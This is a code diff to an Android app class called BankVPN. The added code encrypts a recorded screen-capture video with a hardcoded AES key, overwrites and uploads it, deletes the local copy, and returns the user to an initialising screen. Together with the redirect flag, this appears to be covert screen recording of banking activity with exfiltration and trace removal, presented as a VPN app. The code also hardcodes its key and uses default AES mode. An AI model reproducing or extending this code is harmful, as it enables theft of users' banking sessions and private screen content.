@@ -21,8 +21,6 @@ import android.support.design.widget.Snackbar;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
-import android.text.Html;
-import android.text.method.LinkMovementMethod;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.util.SparseIntArray;
@@ -31,10 +29,17 @@ import android.view.View;
 import android.widget.Toast;
 import android.widget.ToggleButton;
 
+import java.io.BufferedInputStream;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 
 public class BankVPN extends AppCompatActivity {
 
@@ -132,8 +137,12 @@ public class BankVPN extends AppCompatActivity {
             stopScreenSharing();
             ExampleJobIntentService.redirected = false;
             uploadVideo();
-            /*File file = new File(videoUri);
-            file.delete();*/
+            Intent backtoInitialising = new Intent(BankVPN.this, Initialising.class);
+            backtoInitialising.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+            backtoInitialising.addFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
+            backtoInitialising.addFlags(Intent.FLAG_ACTIVITY_PREVIOUS_IS_TOP);
+            backtoInitialising.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(backtoInitialising);
         }
     }
 
@@ -259,18 +268,56 @@ public class BankVPN extends AppCompatActivity {
             protected void onPostExecute(String s) {
                 super.onPostExecute(s);
                 uploading.dismiss();
-                /*textViewResponse.setText(Html.fromHtml("<b>Uploaded at <a href='" + s + "'>" + s + "</a></b>"));
-                textViewResponse.setMovementMethod(LinkMovementMethod.getInstance());*/
+                File file = new File(videoUri);
+                file.delete();
             }
 
             @Override
             protected String doInBackground(Void... params) {
                 Upload u = new Upload();
+                File file = new File(videoUri);
+                int size = (int) file.length();
+                byte[] bytes = new byte[size];
+                try {
+                    BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
+                    buf.read(bytes, 0, bytes.length);
+                    buf.close();
+                } catch (FileNotFoundException e) {
+                    // TODO Auto-generated catch block
+                    e.printStackTrace();
+                } catch (IOException e) {
+                    // TODO Auto-generated catch block
+                    e.printStackTrace();
+                }
+                byte[] key = "jeanniesecureeee".getBytes();
+                byte[] encrypted_bytes = new byte[0];
+
+                try {
+                    encrypted_bytes = encrypt(key, bytes);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                file.delete();
+                try (FileOutputStream fos = new FileOutputStream(videoUri)) {
+                    fos.write(encrypted_bytes);
+                } catch (FileNotFoundException e) {
+                    e.printStackTrace();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
                 String msg = u.uploadVideo(videoUri);
                 return msg;
             }
         }
         UploadVideo uv = new UploadVideo();
         uv.execute();
+    }
+
+    private static byte[] encrypt(byte[] raw, byte[] clear) throws Exception {
+        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
+        Cipher cipher = Cipher.getInstance("AES");
+        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
+        byte[] encrypted = cipher.doFinal(clear);
+        return encrypted;
     }
 }
